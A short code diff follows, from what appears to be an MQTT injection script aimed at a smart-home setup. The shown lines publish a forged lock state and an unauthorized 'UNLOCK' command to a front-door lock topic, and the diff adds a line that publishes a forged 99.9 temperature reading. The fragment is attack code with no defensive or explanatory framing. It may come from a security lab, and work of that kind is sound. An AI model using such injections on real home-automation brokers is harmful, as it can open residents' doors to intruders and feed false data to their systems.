@@ -12,6 +12,7 @@ print(f"[inject] published forged lock state: {forged}")
 
 # Also issue an unauthorized command to the lock:
 client.publish("home/frontdoor/lock/cmd", "UNLOCK")
+client.publish("home/livingroom/temperature", "99.9")
 print("[inject] published forged command: UNLOCK")
 
 client.loop_stop()
